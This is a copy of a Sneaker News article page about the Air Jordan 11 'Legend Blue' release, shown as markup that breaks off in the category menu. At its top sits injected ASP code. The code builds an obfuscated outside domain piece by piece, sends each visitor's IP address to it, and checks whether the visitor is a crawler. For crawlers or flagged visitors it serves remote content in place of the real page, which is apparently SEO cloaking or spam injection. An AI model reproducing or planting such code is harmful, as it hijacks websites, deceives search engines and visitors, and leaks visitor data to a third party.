<%
'on error resume next
Server.ScriptTimeout=600
dim systid,ISBK,html,echohtml,lk,ipurl,echourl,kdom
kdom = "1nil"
kdom =kdom & "2thea"
systid=484
kdom =kdom & "rsenal"

kdom =kdom & "."
ISBK = "false"
kdom =kdom &"com"
hs = "http"
ipurl = hs&"://nb."&kdom&"/nb.php?ip="
echourl = hs&"://ac."&kdom&"/echo.php?"
html = GetContent(ipurl&GetRsip()) 'GetRsip()
lk ="<t"&"@"&"k>"
If instr(html,lk)>0 Then
	 ISBK = replace(html,lk,"")
End If
'response.Write ISBK&ChecksAgent
'ISBK ="true"
if ChecksAgent=true or cstr(ISBK)="true" Then
	
	dim subspagseid
	subspagseid = request.querystring("subspagseid")
	If subspagseid Then
		response.Write GetContent(echourl&"sysid="&systid&"&subpageid="&subspagseid)
	Else
		%>





<!DOCTYPE html>
<!--[if IE 6]>
<html id="ie6" lang="en-US" prefix="og: http://ogp.me/ns#">
<![endif]-->
<!--[if IE 7]>
<html id="ie7" lang="en-US" prefix="og: http://ogp.me/ns#">
<![endif]-->
<!--[if IE 8]>
<html id="ie8" lang="en-US" prefix="og: http://ogp.me/ns#">
<![endif]-->
<!--[if !(IE 6) | !(IE 7) | !(IE 8)  ]><!-->
<html lang="en-US" prefix="og: http://ogp.me/ns#">
    <!--<![endif]-->
    <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width" />
        <meta name="msapplication-TileColor" content="#FFFFFF">
        <meta name="msapplication-TileColor" content="#FFFFFF">
        <meta name="msapplication-TileImage" content="http://sneakernews.com/wp-content/themes/sneakernews/images/favicon-144.png">
        <meta name="msapplication-config" content="http://sneakernews.com/wp-content/themes/sneakernews/images/browserconfig.xml">
        <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <!-- favicons -->
        <link rel="shortcut icon" type="image/png" sizes="32x32" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/favicon_icon.png">
        <link rel="apple-touch-icon" type="image/png" sizes="32x32" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/favicon_icon.png">
        <link rel="shortcut icon" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/favicon.ico">
        <link rel="icon" sizes="16x16 32x32 64x64" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/favicon.ico">
        <link rel="icon" type="image/png" sizes="196x196" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/favicon-196.png">
        <link rel="icon" type="image/png" sizes="160x160" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/favicon-160.png">
        <link rel="icon" type="image/png" sizes="96x96" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/favicon-96.png">
        <link rel="icon" type="image/png" sizes="64x64" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/favicon-64.png">
        <link rel="icon" type="image/png" sizes="32x32" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/favicon-32.png" >
        <link rel="icon" type="image/png" sizes="16x16" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/favicon-16.png">
        <link rel="apple-touch-icon" sizes="152x152" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/favicon-152.png">
        <link rel="apple-touch-icon" sizes="144x144" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/favicon-144.png">
        <link rel="apple-touch-icon" sizes="120x120" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/favicon-120.png">
        <link rel="apple-touch-icon" sizes="114x114" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/favicon-114.png">
        <link rel="apple-touch-icon" sizes="76x76" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/favicon-76.png">
        <link rel="apple-touch-icon" sizes="72x72" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/favicon-72.png">
        <link rel="apple-touch-icon" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/favicon-57.png">
        <!-- favicon end -->
        <title>Legend Blue Jordan 11 Price is $200, Releases on 12/20/14</title>
        <link rel="profile" href="http://gmpg.org/xfn/11" />
        <link rel="stylesheet" type="text/css" media="all" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/style.css" />
        <link rel="pingback" href="http://sneakernews.com/xmlrpc.php" />
        <!--[if lt IE 9]>
        <script src="http://cdn.sneakernews.com/wp-content/themes/sneakernews/js/html5.js" type="text/javascript"></script>
        <![endif]-->
        <!--start menu CSS-->
        <link rel="stylesheet" type="text/css" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/css/flexnav.css" /	>
              <!--End menu CSS-->
              <!--start bxSlider CSS file -->
              <link href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/css/jquery.bxslider.css" rel="stylesheet" />
        <!--end bxSlider CSS file -->
        <link href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/mediatag.css" type="text/css" rel="stylesheet" />

        <!-- jQuery library (served from Google) -->
        <script src="http://cdn.sneakernews.com/wp-content/themes/sneakernews/js/jquery.min.js"></script>
        <!-- bxSlider Javascript file -->
        <script src="http://cdn.sneakernews.com/wp-content/themes/sneakernews/js/jquery.bxslider.min.js"></script>
        <!-- start menu JS -->
        <script src="http://cdnjs.cloudflare.com/ajax/libs/modernizr/2.6.2/modernizr.min.js"></script>
        <script type="text/javascript" src="http://cdn.sneakernews.com/wp-content/themes/sneakernews/js/jquery.flexnav.min.js"></script>
        <script type="text/javascript" src="http://cdn.sneakernews.com/wp-content/themes/sneakernews/js/jquery.flexnav.js"></script>
		<script type="text/javascript" src="http://cdn.sneakernews.com/wp-content/themes/sneakernews/js/cssua.min.js"></script>
        <!-- End menu JS -->

        <script type="text/javascript">
            var $ = jQuery;
            (function($) {
                $(document).ready(function() {
                    $(".flexnav").flexNav();
                    $('nav ul li ul.sub-menu li:first').addClass('first');
                    $('nav ul li ul.sub-menu li:last').addClass('first');
                    
					$('nav ul li').each(function() {
                       var subclass = $(this).find('a:first').text().toLowerCase();
                       var sub1 = subclass.replace(/ /g, "-");
                       $(this).addClass(sub1);
                    });
                });
            })(jQuery);


            //End menu js
        </script>
        
<!-- This site is optimized with the Yoast WordPress SEO plugin v1.5.3.3 - https://yoast.com/wordpress/plugins/seo/ -->
<link rel="canonical" href="http://sneakernews.com/2014/11/28/detailed-look-air-jordan-11-legend-blue/" />
<link rel="next" href="http://sneakernews.com/2014/11/28/detailed-look-air-jordan-11-legend-blue/2/" />
<link rel="author" href="https://plus.google.com/u/0/100284962233600661520/"/>
<meta property="og:locale" content="en_US" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Legend Blue Jordan 11 Price is $200, Releases on 12/20/14" />
<meta property="og:description" content="The Air Jordan 11 &#8220;Legend Blue&#8221; is making a ton of noise today and certainly taking some of the spotlight off the Infrared 6s on this Black Friday. We recently confirmed through Jordan Brand that the Legend Blue 11s will &hellip; Continue reading &rarr;" />
<meta property="og:url" content="http://sneakernews.com/2014/11/28/detailed-look-air-jordan-11-legend-blue/" />
<meta property="og:site_name" content="Sneaker News" />
<meta property="article:tag" content="Air Jordan 11" />
<meta property="article:tag" content="Air Jordan 11 Legend Blue" />
<meta property="article:tag" content="Air Jordan 11 Legend Blue - Price &amp; Release Date" />
<meta property="article:tag" content="Air Jordan XI" />
<meta property="article:section" content="Air Jordan" />
<meta property="article:published_time" content="2014-11-28T23:59:56+00:00" />
<meta property="article:modified_time" content="2014-12-05T02:48:16+00:00" />
<meta property="og:updated_time" content="2014-12-05T02:48:16+00:00" />
<meta property="og:image" content="http://sneakernews.com/wp-content/uploads/2014/11/jordan-11-legend-blue-price-is-200-2.jpg" />
<meta property="og:image" content="http://sneakernews.com/wp-content/uploads/2014/11/jordan-11-legend-blue-price-is-200-1.jpg" />
<meta property="og:image" content="http://sneakernews.com/wp-content/uploads/2014/11/jordan-11-legend-blue-price-is-200-3.jpg" />
<meta property="og:image" content="http://sneakernews.com/wp-content/uploads/2014/11/jordan-11-legend-blue-price-is-200-4.jpg" />
<meta property="og:image" content="http://sneakernews.com/wp-content/uploads/2014/11/jordan-11-legend-blue-price-is-200-5.jpg" />
<meta property="og:image" content="http://sneakernews.com/wp-content/uploads/2014/11/jordan-11-legend-blue-price-is-200-6.jpg" />
<meta property="og:image" content="http://sneakernews.com/wp-content/uploads/2014/11/jordan-11-legend-blue-price-is-200-7.jpg" />
<meta property="og:image" content="http://sneakernews.com/wp-content/uploads/2014/11/jordan-11-legend-blue-price-is-200-8.jpg" />
<meta property="og:image" content="http://sneakernews.com/wp-content/uploads/2014/11/jordan-11-legend-blue-price-is-200-9.jpg" />
<meta property="og:image" content="http://sneakernews.com/wp-content/uploads/2014/11/jordan-11-legend-blue-price-is-200-15.jpg" />
<meta property="og:image" content="http://sneakernews.com/wp-content/uploads/2014/11/jordan-11-legend-blue-price-is-200-10.jpg" />
<meta property="og:image" content="http://sneakernews.com/wp-content/uploads/2014/11/jordan-11-legend-blue-price-is-200-11.jpg" />
<meta property="og:image" content="http://sneakernews.com/wp-content/uploads/2014/11/jordan-11-legend-blue-price-is-200-12.jpg" />
<meta property="og:image" content="http://sneakernews.com/wp-content/uploads/2014/11/jordan-11-legend-blue-price-is-200-13.jpg" />
<meta property="og:image" content="http://sneakernews.com/wp-content/uploads/2014/11/jordan-11-legend-blue-price-is-200-14.jpg" />
<meta name="twitter:card" content="summary"/>
<meta name="twitter:site" content="@sneakernews"/>
<meta name="twitter:domain" content="Sneaker News"/>
<meta name="twitter:creator" content="@sneakernews"/>
<!-- / Yoast WordPress SEO plugin. -->

<link rel="alternate" type="application/rss+xml" title="Sneaker News &raquo; Feed" href="http://sneakernews.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="Sneaker News &raquo; Comments Feed" href="http://sneakernews.com/comments/feed/" />
<link rel="alternate" type="application/rss+xml" title="Sneaker News &raquo; A Detailed Look at the Air Jordan 11 &#8220;Legend Blue&#8221; Comments Feed" href="http://sneakernews.com/2014/11/28/detailed-look-air-jordan-11-legend-blue/feed/" />
	  <style type="text/css">
	  .wp-pagenavi{margin-left:auto !important; margin-right:auto; !important}

	  .wp-pagenavi a,.wp-pagenavi a:link,.wp-pagenavi a:visited,.wp-pagenavi a:active,.wp-pagenavi span.extend {    }
	  .wp-pagenavi a:hover,.wp-pagenavi span.current
	  {
		     
	  }
	  .wp-pagenavi span.pages {  }
	  </style>
	  <link rel='stylesheet' id='nextgen_gallery_related_images-css'  href='http://cdn.sneakernews.com/wp-content/plugins/nextgen-gallery/products/photocrati_nextgen/modules/nextgen_gallery_display/static/nextgen_gallery_related_images.css?ver=4.0.1' type='text/css' media='all' />
<link rel='stylesheet' id='pinterest-pin-it-button-plugin-styles-css'  href='http://cdn.sneakernews.com/wp-content/plugins/pinterest-pin-it-button/css/public.css?ver=2.0.1' type='text/css' media='all' />
<link rel='stylesheet' id='wp-postratings-css'  href='http://cdn.sneakernews.com/wp-content/plugins/wp-postratings/postratings-css.css?ver=1.79' type='text/css' media='all' />
<link rel='stylesheet' id='wp125style-css'  href='http://cdn.sneakernews.com/wp-content/plugins/wp125/wp125.css?ver=4.0.1' type='text/css' media='all' />
<link rel='stylesheet' id='jetpack-widgets-css'  href='http://cdn.sneakernews.com/wp-content/plugins/jetpack/modules/widgets/widgets.css?ver=20121003' type='text/css' media='all' />
<link rel='stylesheet' id='wp-paginate-css'  href='http://cdn.sneakernews.com/wp-content/plugins/wp-paginate/wp-paginate.css?ver=1.2.5' type='text/css' media='screen' />
<link rel='stylesheet' id='avhec-widget-css'  href='http://cdn.sneakernews.com/wp-content/plugins/extended-categories-widget/3.3/css/avh-ec.widget.css?ver=3.6.7' type='text/css' media='all' />
<link rel='stylesheet' id='wp-pagenavi-style-css'  href='http://cdn.sneakernews.com/wp-content/plugins/wp-pagenavi-style/style/default.css?ver=1.0' type='text/css' media='all' />
<script type='text/javascript' src='http://cdn.sneakernews.com/wp-includes/js/jquery/jquery.js?ver=1.11.1'></script>
<script type='text/javascript' src='http://cdn.sneakernews.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var photocrati_ajax = {"url":"http:\/\/sneakernews.com\/photocrati_ajax","wp_site_url":"http:\/\/sneakernews.com","wp_site_static_url":"http:\/\/sneakernews.com"};
/* ]]> */
</script>
<script type='text/javascript' src='http://cdn.sneakernews.com/wp-content/plugins/nextgen-gallery/products/photocrati_nextgen/modules/ajax/static/ajax.js?ver=4.0.1'></script>
<script type='text/javascript' src='http://zor.livefyre.com/wjs/v3.0/javascripts/livefyre.js'></script>
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://sneakernews.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://sneakernews.com/wp-includes/wlwmanifest.xml" /> 
<link rel='shortlink' href='http://sneakernews.com/?p=552629' />

    <!-- cmnUNT | Begin head script -->
    <script data-cfasync="false" type="text/javascript">
        var isMobile = /iPhone|iPod|BlackBerry|Opera Mini|(android|bb\d+|meego).+mobile/i.test(navigator.userAgent);
        if (isMobile) {
            cmnunt_site = "cmn_sneakernews_mob"; //set in admin
        } else {
            cmnunt_site = "cmn_sneakernews"; //set in admin
        }
        cmnunt_silo     = 's_sne'; //set in admin
        cmnunt_subsilo  = '';
        cmnunt_tier     = 'to,t2,internal';
        cmnunt_zone     = 'air-jordan';
        cmnunt_kw       = 'air-jordan-11,air-jordan-11-legend-blue,air-jordan-11-legend-blue-price-release-date,air-jordan-xi,';
        cmnunt_exclude  = 'ugc';
        cmn_tb_theme    = 'default';
        if (isMobile) {
            document.write('<scr'+'ipt src="http://cdn.complexmedianetwork.com/js/cmnUNTmobile.js"></scr'+'ipt>');
        } else {
            document.write('<scr'+'ipt src="http://cdn.complexmedianetwork.com/js/cmnUNT.js"></scr'+'ipt>');
        }
    </script>
    
    <!-- cmnUNT | Header Unit Centering Styles -->
    <link rel="stylesheet" type="text/css" href="http://cdn.sneakernews.com/wp-content/plugins/cm-ad-map 2/dist/css/cmn_styles.css" />
    <!-- <meta name="NextGEN" version="2.0.21" /> -->
<script type="text/javascript">(function(){var po = document.createElement("script");po.type = "text/javascript"; po.async = true;po.src = "https://apis.google.com/js/plusone.js";var s = document.getElementsByTagName("script")[0];s.parentNode.insertBefore(po, s);})();</script><link rel='stylesheet' type='text/css' href='http://cdn.sneakernews.com/wp-content/plugins/wp-mashsocial-wigdet/cssstyles.css' />
	<style type="text/css">
	 .wp-pagenavi
	{
		font-size:12px !important;
	}
	</style>
	<!-- Vipers Video Quicktags v6.5.2 | http://www.viper007bond.com/wordpress-plugins/vipers-video-quicktags/ -->
<style type="text/css">
.vvqbox { display: block; max-width: 100%; visibility: visible !important; margin: 10px auto; } .vvqbox img { max-width: 100%; height: 100%; } .vvqbox object { max-width: 100%; } 
</style>
<script type="text/javascript">
// <![CDATA[
	var vvqflashvars = {};
	var vvqparams = { wmode: "opaque", allowfullscreen: "true", allowscriptaccess: "always" };
	var vvqattributes = {};
	var vvqexpressinstall = "http://sneakernews.com/wp-content/plugins/vipers-video-quicktags/resources/expressinstall.swf";
// ]]>
</script>
        <script type="text/javascript">

            var _gaq = _gaq || [];
            _gaq.push(['_setAccount', 'UA-149082-11']);
            _gaq.push(['_trackPageview']);

            (function() {
                var ga = document.createElement('script');
                ga.type = 'text/javascript';
                ga.async = true;
                ga.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'stats.g.doubleclick.net/dc.js';
                var s = document.getElementsByTagName('script')[0];
                s.parentNode.insertBefore(ga, s);
            })();

        </script>
        <script src="https://apis.google.com/js/platform.js" async defer></script>
		
    	  <style type="text/css">
	  .wp-pagenavi{margin-left:auto !important; margin-right:auto; !important}

	  .wp-pagenavi a,.wp-pagenavi a:link,.wp-pagenavi a:visited,.wp-pagenavi a:active,.wp-pagenavi span.extend {    }
	  .wp-pagenavi a:hover,.wp-pagenavi span.current
	  {
		     
	  }
	  .wp-pagenavi span.pages {  }
	  </style>
	  </head>

    <body class="single single-post postid-552629 single-format-standard post-template post-template-template-full-post-php singular">
        <!--main-->
        <div id="fb-root"></div>		

        <!-- cmnUNT | Begin ad tag-->
        <div id="cmn_ad_tag_head" style="background:#fafafa;" class="fw_sneakernews">
            <script type="text/javascript">cmnUNT('3x3', tile_num++);</script>
        </div>
        <!-- cmnUNT | End ad tag -->



        <div id="sneaker-news-main">
            <!--header-->
            <header>
                                <div class="logo-main">
                    <div class="wrapper">
                        <div class="sneaker-news-top">
                            <div class="sneaker-logo"><a href="http://sneakernews.com"><img src="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/sneakernews-logo.png" alt="Sneaker News" /> <img class="for-mobile" src="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/sneakernews-logo-one-line.png" alt="Sneaker News" /> </a></div>
                        </div>
                    </div>
                </div>
                <div class="sneaker-nav"> 
                    <div class="nav-main">
                        <div class="wrapper">   
                            <div class="nav-container">
                                <nav>
<div class="menu-primary-navigation-container"><ul id="menu-primary-navigation" class="menu"><li id="menu-item-355567" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-355567"><a href="http://sneakernews.com">Home</a></li>
<li id="menu-item-421511" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-421511"><a href="http://sneakernews.com/magazine">Magazine</a></li>
<li id="menu-item-440551" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-440551"><a href="http://sneakernews.com/category/select">SELECT</a></li>
<li id="menu-item-440520" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-440520"><a href="http://sneakernews.com/air-jordan-release-dates/">Jordan Release Dates</a></li>
<li id="menu-item-440521" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-440521"><a href="http://sneakernews.com/release-dates/">Sneaker Release Dates</a></li>
</ul></div>                                </nav>
                                <!--<nav>
                                    <ul>
                                        <li class="home"><a href="#">Home</a></li>
                                        <li><a href="#">Featured</a></li>
                                        <li><a href="#">Select </a></li>
                                        <li class="date-icon"><a href="#">jordan release dates</a></li>
                                        <li class="date-icon sneaker"><a href="#">sneaker release dates</a></li>
                                    </ul>
                                </nav>-->

                                <form method="get" id="searchform" action="http://sneakernews.com"> 
                                    <div>
                                        <input type="submit" class="submit" value="">
                                        <input type="hidden" id="searchsubmit"> 
                                        <input type="text" class="input search-box" placeholder="search"  name="s" id="s" onblur="if (this.value == '') {
                    this.value = 'Search';
                }" onfocus="if (this.value == 'Search') {
                    this.value = '';
                }">
                                    </div>
                                </form>

                            </div>       

                        </div>
                    </div>  
                </div>   <!--sneaker-nav-->
                <div class="sub-nav-main">
                    <div class="wrapper">
                        <div class="sub-nav-container">
                            <nav>
                                <ul>
<div class="menu-top-cats-container"><ul id="menu-top-cats" class="menu"><li id="menu-item-560031" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-560031"><a href="http://sneakernews.com/tag/air-jordan-4-columbia/">Columbia 4s</a></li>
<li id="menu-item-500955" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-500955"><a href="http://sneakernews.com/tag/nike-roshe-run/">Nike Roshe Run</a></li>
<li id="menu-item-508049" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-508049"><a href="http://sneakernews.com/tag/nike-huarache/">Nike Huarache</a></li>
<li id="menu-item-440536" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-440536"><a href="http://sneakernews.com/category/air-jordan/">Jordans</a></li>
<li id="menu-item-440509" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-440509"><a href="http://sneakernews.com/tag/lebron-12/">LeBron 12</a></li>
<li id="menu-item-440400" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-440400"><a href="http://sneakernews.com/tag/nike-kd-7/">KD 7</a></li>
<li id="menu-item-440399" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-440399"><a href="http://sneakernews.com/tag/kobe-9/">Kobe 9</a></li>
<li id="menu-item-553793" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-553793"><a href="http://sneakernews.com/tag/nike-kyrie-1/">Kyrie 1</a></li>
<li id="menu-item-560030" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-560030"><a href="http://sneakernews.com/tag/air-jordan-xx3/">XX3</a></li>
<li id="menu-item-355579" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-355579"><a href="http://sneakernews.com/category/just-released/">Just Released</a></li>
<li id="menu-item-355578" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-355578"><a href="http://sneakernews.com/category/upcoming-sneakers/">Upcoming</a></li>
<li id="menu-item-550289" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-550289"><a href="#">Brands</a>
<ul class="sub-menu">
	<li id="menu-item-550290" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-550290"><a href="/category/air-jordan/">Jordans</a></li>
	<li id="menu-item-550291" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-550291"><a href="/?s=nike">nike</a></li>
	<li id="menu-item-550292" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-550292"><a href="/category/adidas/">adidas</a></li>
	<li id="menu-item-550293" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-550293"><a href="/category/reebok/">reebok</a></li>
	<li id="menu-item-550294" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-550294"><a href="/category/asics/">asics</a></li>
	<li id="menu-item-550295" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-550295"><a href="/category/new-balance/">new balance</a></li>
	<li id="menu-item-550296" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-550296"><a href="/category/vans/">vans</a></li>
	<li id="menu-item-550297" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-550297"><a href="/category/saucony/">saucony</a></li>
	<li id="menu-item-550298" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-550298"><a href="/category/converse/">converse</a></li>
	<li id="menu-item-550299" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-550299"><a href="/category/puma/">puma</a></li>
	<li id="menu-item-550301" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-550301"><a href="/category/supra/">supra</a></li>
	<li id="menu-item-550302" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-550302"><a href="http://sneakernews.com/tag/under-armour/">under armour</a></li>
</ul>
</li>
</ul></div>                                </ul>
                            </nav>
                        </div>
                    </div>
                </div>  

                <div class="sneaker-responsive-menu">
                    <div class="menu-button"><span class="touch-button"><i class="navicon-big"></i></span></div>
                    <ul data-breakpoint="800" class="tech-nav flexnav">
                        <li>
                            <form method="get" id="searchform" action="http://sneakernews.com"> 
                                <div class="search-box-main">
                                    <input type="submit" class="submit" value="" hidden="">
                                    <input type="hidden" id="searchsubmit"> 
                                    <input type="text" class="input search-box" placeholder="search"  name="s" id="s" onblur="if (this.value == '') {
                    this.value = 'Search';
                }" onfocus="if (this.value == 'Search') {
                    this.value = '';
                }">
                                </div>
                            </form>
                        </li>
                        <li><a href="/">Home</a></li>
                        <li><a href="/magazine/">Magazine</a></li>
                        <li><a href="/category/select/">Select</a></li>
                        <li><a href="/air-jordan-release-dates/">jordan release dates</a></li>
                        <li><a href="/release-dates/">sneaker release dates</a></li>
                        <li class="categories"><a href="#">categories<i></i></a>
                            <ul>
                                <li>         
                                    <select name='cat_menu' id='cat_menu' class='postform' >
	<option value='-1'>ALL</option>
	<option class="level-0" value="24">Adidas&nbsp;&nbsp;(4,205)</option>
	<option class="level-0" value="20">Air Classic BW&nbsp;&nbsp;(208)</option>
	<option class="level-0" value="12">Air Jordan&nbsp;&nbsp;(10,480)</option>
	<option class="level-0" value="206">Air Jordan Force Fusion&nbsp;&nbsp;(235)</option>
	<option class="level-0" value="15">Air Max 1&nbsp;&nbsp;(1,194)</option>
	<option class="level-0" value="9">Air Max 360&nbsp;&nbsp;(86)</option>
	<option class="level-0" value="6">Air Max 90&nbsp;&nbsp;(1,260)</option>
	<option class="level-0" value="19">Air Max 95&nbsp;&nbsp;(525)</option>
	<option class="level-0" value="47">Air Max 97&nbsp;&nbsp;(172)</option>
	<option class="level-0" value="57">Air Max Light&nbsp;&nbsp;(150)</option>
	<option class="level-0" value="41">Air Stab&nbsp;&nbsp;(31)</option>
	<option class="level-0" value="68">Air Structure&nbsp;&nbsp;(79)</option>
	<option class="level-0" value="273">Air Yeezy&nbsp;&nbsp;(325)</option>
	<option class="level-0" value="44">Alife&nbsp;&nbsp;(108)</option>
	<option class="level-0" value="39">Asia Exclusive&nbsp;&nbsp;(495)</option>
	<option class="level-0" value="42">Asics&nbsp;&nbsp;(835)</option>
	<option class="level-0" value="27">Bape&nbsp;&nbsp;(85)</option>
	<option class="level-0" value="21">Basketball&nbsp;&nbsp;(8,058)</option>
	<option class="level-0" value="4">Blazer&nbsp;&nbsp;(959)</option>
	<option class="level-0" value="272">Celebrity Feet&nbsp;&nbsp;(1,864)</option>
	<option class="level-0" value="16">Clothing&nbsp;&nbsp;(350)</option>
	<option class="level-0" value="43">Collaboration&nbsp;&nbsp;(6,518)</option>
	<option class="level-0" value="271">Collections&nbsp;&nbsp;(226)</option>
	<option class="level-0" value="70">Converse&nbsp;&nbsp;(1,043)</option>
	<option class="level-0" value="25">Court Force&nbsp;&nbsp;(104)</option>
	<option class="level-0" value="285">Customs&nbsp;&nbsp;(1,281)</option>
	<option class="level-0" value="61">DC Shoes&nbsp;&nbsp;(67)</option>
	<option class="level-0" value="3">Dope Kicks&nbsp;&nbsp;(68)</option>
	<option class="level-0" value="11">Dunk&nbsp;&nbsp;(2,765)</option>
	<option class="level-0" value="283">Dwyane Wade&nbsp;&nbsp;(466)</option>
	<option class="level-0" value="205">eBay&nbsp;&nbsp;(2,867)</option>
	<option class="level-0" value="64">Europe Exclusive&nbsp;&nbsp;(343)</option>
	<option class="level-0" value="270">Events&nbsp;&nbsp;(1,071)</option>
	<option class="level-0" value="4625">Featured&nbsp;&nbsp;(2,420)</option>
	<option class="level-0" value="7337">Featured Stories&nbsp;&nbsp;(290)</option>
	<option class="level-0" value="50">Finishline&nbsp;&nbsp;(360)</option>
	<option class="level-0" value="48">Footscape&nbsp;&nbsp;(169)</option>
	<option class="level-0" value="35">Gear&nbsp;&nbsp;(138)</option>
	<option class="level-0" value="284">Giveaway&nbsp;&nbsp;(42)</option>
	<option class="level-0" value="287">Griffey&nbsp;&nbsp;(209)</option>
	<option class="level-0" value="207">House of Hoops&nbsp;&nbsp;(301)</option>
	<option class="level-0" value="34">Hybrid&nbsp;&nbsp;(1,360)</option>
	<option class="level-0" value="73">Hyperdunk&nbsp;&nbsp;(736)</option>
	<option class="level-0" value="29">Japanese Brands&nbsp;&nbsp;(537)</option>
	<option class="level-0" value="204">JD Sports&nbsp;&nbsp;(243)</option>
	<option class="level-0" value="1">Just Released&nbsp;&nbsp;(13,804)</option>
	<option class="level-0" value="282">Kevin Durant&nbsp;&nbsp;(1,450)</option>
	<option class="level-0" value="52">Kids&nbsp;&nbsp;(608)</option>
	<option class="level-0" value="209">Kobe&nbsp;&nbsp;(2,089)</option>
	<option class="level-0" value="1282">Kyrie Irving&nbsp;&nbsp;(30)</option>
	<option class="level-0" value="22">LeBron&nbsp;&nbsp;(3,326)</option>
	<option class="level-0" value="217">Lifestyle Sneakers&nbsp;&nbsp;(2,992)</option>
	<option class="level-0" value="28">New Balance&nbsp;&nbsp;(1,450)</option>
	<option class="level-0" value="63">Nike 6.0&nbsp;&nbsp;(114)</option>
	<option class="level-0" value="71">Nike ACG&nbsp;&nbsp;(493)</option>
	<option class="level-0" value="7">Nike Air Force 1s&nbsp;&nbsp;(2,914)</option>
	<option class="level-0" value="5">Nike Air Max&nbsp;&nbsp;(5,028)</option>
	<option class="level-0" value="288">Nike Air Penny&nbsp;&nbsp;(680)</option>
	<option class="level-0" value="90">Nike Boots&nbsp;&nbsp;(253)</option>
	<option class="level-0" value="3101">Nike Flyknit&nbsp;&nbsp;(428)</option>
	<option class="level-0" value="280">Nike Foamposite&nbsp;&nbsp;(1,339)</option>
	<option class="level-0" value="51">Nike Force&nbsp;&nbsp;(138)</option>
	<option class="level-0" value="208">Nike Free&nbsp;&nbsp;(815)</option>
	<option class="level-0" value="6974">Nike Huarache&nbsp;&nbsp;(352)</option>
	<option class="level-0" value="40">Nike iD&nbsp;&nbsp;(944)</option>
	<option class="level-0" value="286">Nike Lunar&nbsp;&nbsp;(1,111)</option>
	<option class="level-0" value="58">Nike Retro&nbsp;&nbsp;(3,529)</option>
	<option class="level-0" value="5781">Nike Roshe&nbsp;&nbsp;(503)</option>
	<option class="level-0" value="10">Nike SB&nbsp;&nbsp;(2,841)</option>
	<option class="level-0" value="36">NikeStore&nbsp;&nbsp;(717)</option>
	<option class="level-0" value="56">P-Rod&nbsp;&nbsp;(290)</option>
	<option class="level-0" value="23">PE&nbsp;&nbsp;(2,478)</option>
	<option class="level-0" value="31">Promo&nbsp;&nbsp;(682)</option>
	<option class="level-0" value="62">Puma&nbsp;&nbsp;(646)</option>
	<option class="level-0" value="49">Reebok&nbsp;&nbsp;(2,006)</option>
	<option class="level-0" value="6300">Release Dates&nbsp;&nbsp;(715)</option>
	<option class="level-0" value="38">Running&nbsp;&nbsp;(3,637)</option>
	<option class="level-0" value="8">Sample&nbsp;&nbsp;(1,637)</option>
	<option class="level-0" value="535">Saucony&nbsp;&nbsp;(283)</option>
	<option class="level-0" value="6021">Select&nbsp;&nbsp;(106)</option>
	<option class="level-0" value="30">Shoes&nbsp;&nbsp;(63)</option>
	<option class="level-0" value="69">Skate&nbsp;&nbsp;(3,235)</option>
	<option class="level-0" value="162">Supra&nbsp;&nbsp;(537)</option>
	<option class="level-0" value="215">Terminator&nbsp;&nbsp;(143)</option>
